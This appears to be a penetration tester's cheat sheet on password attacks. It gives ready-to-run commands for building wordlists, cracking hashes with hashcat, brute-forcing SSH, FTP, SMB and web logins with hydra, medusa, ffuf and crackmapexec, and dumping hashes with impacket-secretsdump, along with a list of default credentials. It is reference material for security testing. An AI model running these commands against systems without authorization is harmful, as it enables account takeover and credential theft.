# Password Attacks Reference

This document contains useful commands and references for password attacks
during penetration testing.

---

## 1. Wordlist Generation & Manipulation

### Website Word Extraction

```bash
# Extract words from a target website for custom wordlist creation
cewl $URL >> words

# Clean up and deduplicate the wordlist
cat words | sort | uniq > tmp
mv tmp word
```

### Crunch - Pattern-Based Generation

```bash
# Generate passwords with specific characters and length range
crunch 8 9 abc123 # Passwords with abc123 8-9 characters long

# Generate pattern-based passwords (@ = lowercase alpha, % = number)
crunch 11 11 0123456789 -t password@@@ # 'password' followed by 3 numbers
```

### Word Mangling

```bash
# Create variations with leetspeak and other transformations
rsmangler --file wordlist.txt --output mangled.txt

# Create compound passwords with length constraints
rsmangler --file wordlist.txt --min 12 --max 13
```

### Hashcat Rule-Based Generation

```bash
# Apply rules to existing wordlist to generate variations
hashcat --force test.lst -r /usr/share/hashcat/rules/d3ad0ne.rule --stdout

# Mask attack for partial password (append 4 digits)
hashcat <hash> -a 3 partial_password_?d?d?d?d 
```

---

## 2. Password Cracking Tools

### Hashcat Hash Types Reference

| Command  | Hash Type  |
| -------- | ---------- |
| -m 0     | MD5        |
| -m 100   | SHA1       |
| -m 1000  | NTLM       |
| -m 1800  | SHA512     |
| -m 3200  | Joomla     |
| -m 7900  | Drupal7    |
| -m 13100 | Kerberoast |

---

## 3. Online Password Attacks

### Hydra

#### SSH Brute Force

```bash
# Try username/password combinations against SSH
hydra -L users -P words ssh://$IP

# Add additional flags for verbose output and stopping after first success
hydra -L users -P words -t 4 -V -f ssh://$IP
```

#### HTTP Form Attacks

```bash
# Basic HTTP POST form attack
hydra $IP -l admin -P $ROCKYOU http-post-form "/login.php:username=admin&password=^PASS^:Wrong username or password" -vV -f

# Complex HTTP POST with JSON and custom headers
hydra -v -V -L "users.txt" -P "passwords.txt" -s 80 \
  architectureservice.tester.com http-post-form \
  "/api/v1/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:S=firstName:H=Accept: application/json, text/plain, */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate:H=Referer: http\://architectureclient.tester.com/:H=Origin: http\://architectureclient.tester.com:H=Connection: keep-alive"
```

#### FTP Brute Force

```bash
# FTP attack with null/same/reverse options enabled
hydra -L $WORDLISTS/SecLists/Usernames/top-usernames-shortlist.txt -P $WORDLISTS/SecLists/Passwords/500-worst-passwords.txt ftp://$IP -e nsr
```

### Medusa

```bash
# HTTP htaccess-protected directory attack
medusa -h $IP -M http -u admin -P $ROCKYOU -m DIR:/admin

# SMB/NTLM authentication attack
medusa -h $IP -M smbnt -u admin -P $ROCKYOU
```

### FFUF - Web Form Fuzzing

```bash
# Basic web form brute force with username and password fields
ffuf -w <USERNAME_FILE>:W1,<PASSWORD_FILE>:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u $URL/customers/login -fc 200

# Using rockyou wordlist against a specific form
ffuf -w users.txt:W1,$ROCKYOU:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u $URL/customers/login -fc 200
```

### CrackMapExec - Windows/Domain Attacks

```bash
# Test user/password list against SMB
crackmapexec smb $IP -u ./users -p ./passwords

# Single password against user list
crackmapexec smb $IP -u ./users -p <password>

# Run with modules (use -M to list available modules)
crackmapexec smb $IP -u <user> -p <password> -M <module_name>

# Extract password hashes with successful credentials
impacket-secretsdump <domain>/<username>:<password>@<IP>
```

---

## 4. Common Default & Weak Passwords

- admin / admin
- admin / adminadmin
- admin / password
- admin / password123
- admin / <company_name>
- root / root
- root / toor
- administrator / administrator
- administrator / password
- <service_name> / <service_name>
- <product_name> / <product_name>

---

## 5. Useful Wordlists

### General Purpose

- `/opt/w1ld0s/wordlists/rockyou.txt` (Common passwords)

### Specialized Lists

- `/opt/w1ld0s/wordlists/SecLists/Passwords/Keyboard-Combinations.txt` (Keyboard patterns)
- `/opt/w1ld0s/wordlists/wfuzz/others/common_pass.txt` (Common passwords)
- `/opt/w1ld0s/wordlists/SecLists/Passwords/Default-Credentials/` (Default creds by
  product)
-
`/opt/w1ld0s/wordlists/SecLists/Passwords/Common-Credentials/top-passwords-shortlist.txt` (
Most common)

### Username Lists

- `/opt/w1ld0s/wordlists/SecLists/Usernames/top-usernames-shortlist.txt` (Common usernames)
- `/opt/w1ld0s/wordlists/SecLists/Usernames/Names/names.txt` (Common names)

---

## 6. Additional Resources

- [Michal Szalkowski's Bruteforce List](http://michalszalkowski.com/security/bruteforce/) -
  Common CMS bruteforce techniques
- [HashCat Wiki](https://hashcat.net/wiki/) - Comprehensive hash cracking
  documentation
- [CeWL Documentation](https://digi.ninja/projects/cewl.php) - Website wordlist
  generation
